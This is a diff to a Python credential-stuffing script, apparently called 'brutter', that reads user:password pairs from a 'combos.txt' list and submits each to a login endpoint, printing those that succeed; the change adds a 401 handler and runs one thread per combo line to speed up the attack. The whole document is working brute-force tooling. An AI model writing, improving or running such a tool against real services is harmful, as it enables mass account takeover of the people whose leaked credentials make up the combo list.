@@ -47,17 +47,31 @@ def brutter(user, password):
     elif response.status_code == 500:
         print(f"{Color.red_bold}Response [500] , SERVER DOWN .{Color.no_colored}")
         exit()
+    elif response.status_code == 401:
+        print(f"{Color.red_bold}Response [401] , SERVER DOWN .{Color.no_colored}")
+        exit()
 
     else:
         print(f"{Color.blue_bold}{user}:{password}{Color.no_colored}")
 
-with open("combos.txt", 'r', encoding='utf-8') as combo:
-    lines = combo.readlines()
+def process_combo(combo):
+    parts = combo.strip().split(":")
+    if len(parts) == 2:
+        user = parts[0]
+        password = parts[1]
+        brutter(user, password)
+    else:
+        pass
+
+if __name__ == "__main__":
+    with open("combos.txt", 'r', encoding='utf-8') as combo:
+        lines = combo.readlines()
+    
+    threads = []
     for line in lines:
-        parts = line.strip().split(":")
-        if len(parts) == 2:
-            user = parts[0]
-            password = parts[1]
-            brutter(user, password)
-        else:
-            continue
+        thread = threading.Thread(target=process_combo, args=(line,))
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
